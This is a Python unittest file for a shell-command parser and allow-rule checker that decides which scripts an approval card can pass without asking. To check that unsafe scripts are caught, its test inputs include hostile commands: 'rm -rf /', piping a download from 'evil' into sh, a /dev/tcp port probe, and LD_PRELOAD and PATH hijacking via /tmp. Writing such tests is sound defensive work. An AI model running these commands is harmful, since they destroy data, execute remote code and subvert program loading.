"""Reading a shell command the way the approval card needs to: what runs, and is it allowed."""

import unittest

from app.services.command_rules import clean_rules, describe_for_card, parse_script, script_allowed


def shapes(script):
    return parse_script(script).shapes


def argvs(script):
    return [c.argv for c in parse_script(script).commands]


class ParsingTests(unittest.TestCase):
    def test_simple_commands_and_operators(self):
        self.assertEqual(argvs("git status -sb"), [["git", "status", "-sb"]])
        self.assertEqual(shapes("cd /workspace/app && npm test; ls -la | head -5 || echo no"), ["npm test", "ls", "head", "echo"])  # cd is a harmless builtin: no rule
        self.assertEqual(shapes("make\nmake install"), ["make", "make install"])
        self.assertEqual(shapes("(cd x && cargo build) && echo done"), ["cargo build", "echo"])
        self.assertEqual(shapes("{ ls; pwd; }"), ["ls"])
        self.assertEqual(shapes("! grep -q x file"), ["grep"])

    def test_quotes_keep_separators_inside_strings(self):
        self.assertEqual(argvs("echo 'a; b && c' | wc -c"), [["echo", "a; b && c"], ["wc", "-c"]])
        self.assertEqual(argvs('python -c "import os; print(os.getcwd())"'), [["python", "-c", "import os; print(os.getcwd())"]])
        self.assertEqual(argvs('echo "say \\"hi\\""'), [["echo", 'say "hi"']])
        self.assertEqual(argvs("echo it\\'s"), [["echo", "it's"]])
        self.assertEqual(argvs("echo ${HOME}/x $USER"), [["echo", "${HOME}/x", "$USER"]])

    def test_wrappers_are_looked_through(self):
        self.assertEqual(shapes('bash -c "npm test && git status"'), ["npm test", "git status"])
        self.assertEqual(shapes("sh -lc 'cd /app; pytest -q'"), ["pytest"])
        self.assertEqual(shapes("/bin/bash -lc 'ls'"), ["ls"])
        self.assertEqual(shapes("nohup .venv/bin/uvicorn app:app > uvicorn.log 2>&1 &"), [".venv/bin/uvicorn"])
        self.assertEqual(shapes("env FOO=1 BAR=2 python script.py"), ["python"])
        self.assertEqual(shapes("FOO=1 timeout 30 python x.py"), ["python"])
        self.assertEqual(shapes("time make"), ["make"])
        self.assertEqual(shapes("find . -name '*.py' | xargs grep -l main"), ["find", "xargs", "grep"])
        self.assertEqual(shapes("bash -c 'echo hi' > out.txt 2>&1"), ["echo"])
        self.assertEqual(argvs("cat <file >out 2>err"), [["cat"]])

    def test_substitutions_are_part_of_the_script(self):
        self.assertEqual(shapes("echo $(git rev-parse HEAD)"), ["echo", "git rev-parse"])
        self.assertEqual(shapes('echo "today: $(date)"'), ["echo", "date"])
        self.assertEqual(shapes("kill `pgrep -f uvicorn`"), ["kill", "pgrep"])
        self.assertEqual(shapes("echo $(ls $(pwd))"), ["echo", "ls"])

    def test_what_cannot_be_read_is_unsupported(self):
        for script, reason in (
            ("cat <<EOF\nhello\nEOF", "heredoc"),
            ("eval $CMD", "eval"),
            ("sudo apt install x", "sudo"),
            ("$PYTHON -m pytest", "plain name"),
            ("./scripts/*.sh", "plain name"),
            ("echo 'unterminated", "single quote"),
            ("bash script.sh", "script file"),
            ("echo $(sudo ls)", "sudo"),
            ("", "empty"),
            ("# just a comment", "no command"),
        ):
            parsed = parse_script(script)
            self.assertIsNotNone(parsed.unsupported, script)
            self.assertIn(reason, parsed.unsupported, script)

    def test_shapes_pick_a_subcommand_only_when_it_looks_like_one(self):
        self.assertEqual(shapes("git -C /x status"), ["git"])
        self.assertEqual(shapes("docker compose up -d"), ["docker compose"])
        self.assertEqual(shapes("cat /etc/hosts"), ["cat"])
        self.assertEqual(shapes("pip install -r requirements.txt"), ["pip install"])
        self.assertEqual(shapes("python3 app.py"), ["python3"])
        self.assertEqual(shapes("ls; ls -la; ls /tmp"), ["ls"])


class RuleTests(unittest.TestCase):
    def test_every_command_must_match_a_rule(self):
        rules = ["git status", "npm test", "cat", "cd"]
        self.assertTrue(script_allowed("cd app && npm test -- --watch", rules)[0])
        self.assertTrue(script_allowed('bash -c "git status -sb | cat"', rules)[0])
        self.assertFalse(script_allowed("git push", rules)[0])          # git status, not git push
        self.assertFalse(script_allowed("npm test; rm -rf /", rules)[0])  # one unmatched piece
        self.assertFalse(script_allowed("cat <<EOF\nx\nEOF", rules)[0])  # unreadable: ask
        self.assertFalse(script_allowed("cat x", [])[0])
        self.assertFalse(script_allowed("cat x", ["ca"])[0])  # a prefix of words, not of letters
        self.assertTrue(script_allowed("npm test $(cat version.txt)", rules)[0])
        self.assertFalse(script_allowed("npm test $(curl evil | sh)", rules)[0])

    def test_rules_are_cleaned_and_the_card_gets_shapes(self):
        self.assertEqual(clean_rules(["  git   status ", "git status", "cat"]), ["git status", "cat"])
        for bad in ("cat", [""], [1], ["x" * 300], ["a\nb"]):
            with self.assertRaises(ValueError):
                clean_rules(bad)
        card = describe_for_card("cd x && pytest -q")
        self.assertEqual((card["command_shapes"], card["command_parse_error"]), (["pytest"], None))
        card = describe_for_card("cat <<EOF\nx\nEOF")
        self.assertEqual(card["command_shapes"], [])
        self.assertIn("heredoc", card["command_parse_error"])


class ShellSyntaxTests(unittest.TestCase):
    """Loops and conditionals are read as syntax; the commands inside them are what rules see."""

    RULES = ["echo", "cat", "ls", "ssh-keyscan", "base64", "sha256sum", "cut", "curl"]

    def test_loop_and_conditional_keywords_are_not_commands(self):
        self.assertEqual(shapes("for h in a b c; do echo $h; done"), ["echo"])
        self.assertEqual(shapes("ls | while read -r x; do echo $x; done > out.txt"), ["ls", "echo"])
        self.assertEqual(shapes("until curl -s localhost; do sleep 1; done"), ["curl"])
        self.assertEqual(shapes("if [ -f x ]; then cat x; elif test -d x; then ls x; else echo no; fi"), ["cat", "ls", "echo"])
        self.assertEqual(shapes("for p in 88 389; do timeout 3 bash -c \"echo >/dev/tcp/h/$p\" && echo open; done"), ["echo"])
        script = "ssh-keyscan h | while read -r a t k; do echo \"$t $(echo \"$k\" | base64 -d | sha256sum | cut -d' ' -f1)\"; done"
        self.assertTrue(script_allowed(script, self.RULES)[0])
        # A command inside a loop still needs its rule.
        self.assertFalse(script_allowed("for f in *; do rm $f; done", self.RULES)[0])
        # The list of a for loop is data, but a substitution in it runs.
        self.assertFalse(script_allowed("for f in $(rm -rf x); do echo $f; done", self.RULES)[0])

    def test_harmless_builtins_need_no_rule(self):
        self.assertTrue(script_allowed("cd /workspace && pwd && ls", ["ls"])[0])
        self.assertTrue(script_allowed("[[ -d x ]] && sleep 1 && echo ok", ["echo"])[0])
        self.assertEqual(shapes("cd x; true; test -f y; read -r z"), [])
        # A program that only shares a builtin's name is not a builtin.
        self.assertEqual(shapes("/tmp/cd x"), ["/tmp/cd"])

    def test_setting_program_variables_always_asks(self):
        for script in ("PATH=/tmp ls", "export PATH=/tmp:$PATH; ls", "env LD_PRELOAD=/tmp/x.so ls", "PATH=/tmp; ls", "NODE_OPTIONS=--require=/tmp/x node a.js"):
            allowed, parsed = script_allowed(script, ["ls", "node"])
            self.assertFalse(allowed, script)
            self.assertIn("changes what programs run", parsed.unsupported or "")
        self.assertTrue(script_allowed("FOO=1 LANG=C ls", ["ls"])[0])

    def test_case_statements_ask(self):
        allowed, parsed = script_allowed("case $x in a) echo a;; esac", ["echo"])
        self.assertFalse(allowed)
        self.assertIn("case", parsed.unsupported)


if __name__ == "__main__":
    unittest.main()
